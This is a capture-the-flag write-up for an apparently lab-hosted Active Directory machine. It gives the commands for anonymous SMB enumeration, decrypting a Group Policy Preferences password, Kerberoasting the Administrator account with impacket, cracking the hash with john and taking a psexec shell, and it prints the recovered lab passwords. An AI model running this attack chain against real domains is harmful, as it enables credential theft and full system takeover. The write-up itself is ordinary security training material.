#Pwned! 
```IP
10.10.10.100
```
# Enumeration
## SMB
```
nxc smb 10.10.10.100 -u '' -p '' --shares
```
```
smbclient //10.10.10.100/Replication
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222100646.png?raw=true)
In the `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` directory it is possible to find a Groups.xml file that seems to contain credentials for SVC_TGS
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222100923.png?raw=true)

# Exploitation
If we goolge `groups.xml cpassword decrypt` we will get some github pages for decrypting the password like:
https://github.com/t0thkr1s/gpp-decrypt
```
python gpp-decrypt.py -f ../../files/Groups.xml
```
And voilà!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222102733.png?raw=true)
Our password is:
```
GPPstillStandingStrong2k18
```
We can now enumerate other users:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222102912.png?raw=true)
Let's try some AD attack methods. As Rep Roasting doesn't seem to work:
```
impacket-GetNPUsers -dc-ip 10.10.10.100 active.htb/svc_tgs
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222103324.png?raw=true)
But kerberoast does!
```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222103349.png?raw=true)
It retrieves an Administrator hash. Let's try cracking it with john:
```
john --wordlist=/usr/share/wordlists/rockyou.txt files/administrator.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222103639.png?raw=true)
```
Ticketmaster1968
```
Now we can goin with PSExec:
```
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```
And get the flag:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222104100.png?raw=true)
# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

